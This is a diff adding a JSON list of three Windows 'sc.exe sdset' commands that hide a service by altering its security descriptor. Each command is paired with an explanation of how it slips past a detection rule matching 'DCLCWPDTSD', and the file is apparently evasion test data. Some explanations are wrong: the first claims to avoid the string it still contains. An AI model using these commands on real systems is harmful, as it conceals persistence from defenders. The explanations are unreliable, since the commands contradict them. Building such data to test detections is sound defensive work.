@@ -1,0 +1,14 @@
+[
+  {
+    "output": "sc.exe sdset \"MyHiddenService\" D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)",
+    "explanation": "The rule looks for the exact contiguous string 'DCLCWPDTSD'. By rearranging the ACE (Access Control Entry) flags within the SDDL string\u2014which is functionally equivalent in Windows\u2014the command achieves the same result of hiding the service while failing the specific string match."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\sc.exe C:\\Windows\\Temp\\not_sc.exe && C:\\Windows\\Temp\\not_sc.exe sdset \"MyHiddenService\" D:(D;;DCLCWPDTSD;;;IU)",
+    "explanation": "While the rule attempts to check 'OriginalFileName', some SIEM configurations or EDR telemetry may rely primarily on the 'Image' path. Renaming the binary can occasionally bypass detections that do not correctly normalize or verify the PE metadata field against the process image."
+  },
+  {
+    "output": "sc.exe sdset \"MyHiddenService\" D:(D;;DC;;;IU)(D;;LC;;;IU)(D;;WP;;;IU)(D;;DT;;;IU)(D;;SD;;;IU)",
+    "explanation": "The rule expects a single ACE containing all specific rights 'DCLCWPDTSD'. By breaking these rights into multiple, separate Access Control Entries (ACEs) for the same Trustee (e.g., Interactive Users 'IU'), the cumulative effect on the service DACL remains the same, but the detection string is never formed."
+  }
+]
